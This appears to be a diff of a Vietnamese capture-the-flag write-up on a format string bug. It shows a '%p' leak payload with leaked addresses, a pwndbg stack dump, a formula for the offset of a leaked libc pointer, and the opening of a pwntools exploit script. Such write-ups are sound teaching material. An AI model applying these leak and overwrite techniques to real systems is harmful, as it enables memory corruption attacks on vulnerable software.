@@ -25,14 +25,12 @@ ABC
 %p %p %p %p %p %p %p %p
 0x7ffcd2d516a0 0xff 0x7f522b22f981 (nil) 0x7f522b319f40 0x7025207025207025 0x2520702520702520 0x2070252070252070
 �2+R
-
 ```
 
 Có vẻ bài toán nhận đầu vào, sau đó khi ta nhập vào thì nó in ra lại chuỗi ta đã nhập -> Format String Bug. Cùng nhau dissamble file binary để xem đoạn code nào
 
 ```
 undefined8 main(void)
-
 {
   char input [270];
   short i;
@@ -250,7 +248,6 @@ pwndbg>
 3d:01e8│+0d0 0x7fffffffda40 ◂— 0
 3e:01f0│+0d8 0x7fffffffda48 ◂— 0
 3f:01f8│+0e0 0x7fffffffda50 —▸ 0x401060 (_start) ◂— endbr64
-
 ```
 
 Có thể leak được địa chỉ `__libc_start_main` ở địa chỉ `0x7fffffffda18`. Để biết được nó ở offset nào thì ban đầu ta cần xác định được chỗ ta nhập input là ở địa chỉ nào của stack đã. Sau đó áp dụng công thức: `(địa chỉ cần biết offset - địa chỉ input) / 8 + 6`
@@ -326,7 +323,6 @@ e = ELF('./yet_another_fsb_patched')
 libc = ELF('./libc.so.6')
 
 # Stage 1: overwrite last byte for while index
-
 while True:
 try:
 p = process('./yet_another_fsb_patched') # p = remote(HOST, 443, ssl=True, sni=HOST)
